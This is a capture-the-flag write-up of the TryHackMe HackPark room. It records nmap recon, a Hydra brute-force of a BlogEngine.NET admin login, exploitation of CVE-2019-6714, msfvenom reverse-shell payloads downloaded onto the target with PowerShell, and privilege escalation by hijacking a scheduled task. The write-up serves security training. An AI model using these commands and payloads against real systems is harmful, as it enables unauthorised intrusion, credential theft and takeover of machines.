# [TryHackMe:HackerPark](https://tryhackme.com/room/hackpark)
## Summary
Windows Server 2012 R2 machine running a vulnerable BlogEngine.NET 3.3.6 instance. Started with Nmap recon, cracked the admin password using Hydra, then exploited CVE-2019-6714 (directory traversal → RCE) to land an initial shell. Upgraded to a Meterpreter session, ran winPEAS for enumeration, and escalated to SYSTEM by hijacking a scheduled task running every 30 seconds via SystemScheduler.
## Enumeration

Starting with an Nmap scan to discover open ports and services using default scripts and OS detection.

```bash
sudo nmap -p- -Pn -sV -O -sC -T4 10.130.138.81
```

**Nmap Result**

```
Nmap scan report for 10.130.138.81
Host is up (0.00096s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2026-04-13T11:46:40+00:00; 0s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Port 80 is running an HTTP server worth investigating. After reviewing the page source, I found the framework version at line `182` — this version disclosure can be leveraged to find a known exploit.

**Searching for exploits matching this version:**

```bash
searchsploit BlogEngine 3.3.6
```

```
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                      | aspx/webapps/46353.cs
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution      | aspx/webapps/47010.py
BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                                 | aspx/webapps/47035.py
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Execution | aspx/webapps/47011.py
BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection
```

[CVE-2019-6714](https://www.exploit-db.com/exploits/46353) allows Remote Code Execution (RCE), but requires an authenticated user account capable of making `PUT` and `POST` requests.

---

## Initial Access

### Credential Brute-Force

Inspecting the website reveals a login page.

![image](../../images/hac-1_clean.png)

The login URL contains `/admin/` as the return path, suggesting `admin` is a valid username:

```
http://10.130.138.81/Account/login.aspx?ReturnURL=/admin/
```

Using Hydra to brute-force the password (POST form data captured via Burp Suite):

```bash
hydra -l "admin" -P /usr/share/wordlists/rockyou.txt 10.130.138.81 http-post-form \
"/Account/login.aspx/admin:__VIEWSTATE=4xMflOoT07SAzG%2BqS8WFiWeLfFwve6Mq9Q33JK92d6mQ%2B%2FhtMEIDyii%2FULf4zYHNLIBgnpiWmakziQPGPsrr8NKg0hG5JBnDPmxE%2B%2BFj%2F4jdTAROBM1Sbi4gHKYi1h633Byof%2FDQJgiQpjX01AL1a6dsKz2LUwDbZVn%2BRWZbyXo1whNlnuTmDZxi2jd%2F%2BL79WeD0Crpq4IqR8%2BisIotJUfunU8SQYjgTF6TsrPnjDogXiaZgWntskqnu%2BIqP%2BlZm4hbU4vNwxjHsTJ2GaMcVzugulPd5Mwgth5GnHMn48JjYDu6ZxBBibzl12%2FrM5ZS7Cn2n0%2BAwztS1PmLSePbGzEcalFe4In3hc7iEyt%2FoUbDsUkmc&__EVENTVALIDATION=Z3m6ElH%2BMOS%2BBz4iF4FRlDHQNX4DYViwMJRKAFj9TaZCuXg2q6%2FOChvAQ2HWhpc0Lz9d4WieJcoDMfgzhYbe8K4HKwuMWP%2Br9RRnyNf2b5o3iNo4seReuxDI6zEhuchr3FisRvjMCYH%2BN3JqbFbrA0Yb466lTPhVwO60MF8hZzrVTAiy&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=failed" \
-v -I
```

The POST form data was captured from Burp Suite:

![image](../../images/hac-2_clean.png)

Hydra successfully recovered the password: `1qaz2wsx`

---

### Exploiting CVE-2019-6714

With administrator access confirmed, we can now exploit the CVE discovered during enumeration.

![image](../../images/hac-3_clean.png)

Following the instructions in [CVE-2019-6714](https://www.exploit-db.com/exploits/46353) to gain an initial shell on the server:

![image](../../images/hac-4_clean.png)

---

## Pivot Upgrading to Meterpreter Shell

Running `systeminfo` on the compromised system to gather OS details before generating a Meterpreter payload:

```
c:\windows\system32\inetsrv>systeminfo

Host Name:                 HACKPARK
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00252-70000-00000-AA886
Original Install Date:     8/3/2019, 10:43:23 AM
System Boot Time:          4/13/2026, 4:30:38 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
```

**Generating the Meterpreter payload:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.130.70.68 LPORT=8888 -a x86 -e x86/shikata_ga_nai -f exe -i 3 -o shell.exe
```

**Delivering the payload:**

Start a Python HTTP server on the attacking machine:

```bash
python3 -m http.server 7755
```

Download the payload from the initial shell:

```
powershell -c "wget 'http://10.130.70.68:7755/shell.exe' -Outfile C:\Users\Public\shell.exe"
```

Before executing, set up a Metasploit multi/handler listener:

![image](../../images/hac-5_clean.png)

> **Note:** Make sure to set the payload to `windows/meterpreter/reverse_tcp` in the handler.

Execute the payload on the target:

```
start shell.exe
```

![image](../../images/hac-6_clean.png)

Meterpreter session established.

---

## Privilege Escalation

### Enumeration

Upload [winPEAS.bat](https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASbat/winPEAS.bat) to the target via the Meterpreter session:

```
msf> upload winPEAS.bat
```

Drop into a shell and run it:

```
# our metasploit shell
msf> shell
$ start winPEAS.bat
```

winPEAS reveals that **SystemScheduler** is running on the machine. Investigating the scheduled tasks directory:

```
msf> cd C:\\Program Files (x86)\\SystemScheduler\\Events
```

The log file `20198415519.INI_LOG.txt` shows that a task named `Message.exe` is being executed and terminated every 30 seconds.

![image](../../images/hac-7_clean.png)

### Scheduled Task Hijacking

Since we have write access to the SystemScheduler directory, we can replace `Message.exe` with a malicious payload that will be executed automatically by the scheduler.

**Steps:**

1. Generate a new Meterpreter payload named `Message.exe`:

```bash
msfvenom -p windows/meterpreter_reverse_tcp -f exe -a x86 -e x86/shikata_ga_nai -i 3 LHOST=10.130.70.68 LPORT=5555 -o Message.exe
```

2. Rename the original binary and upload the malicious payload:

```
msf> mv Message.exe Message.bak
msf> upload Message.exe
```

3. Set up a new Metasploit handler for the incoming connection:

![image](../../images/hac-8_clean.png)

4. Wait up to 30 seconds for the scheduler to execute the payload:

![image](../../images/hac-9_clean.png)

**Administrator privileges obtained.**

---

## Flags

![image](../../images/hac-10_clean.png)

**Root Flag**

![image](../../images/hac-11_clean.png)
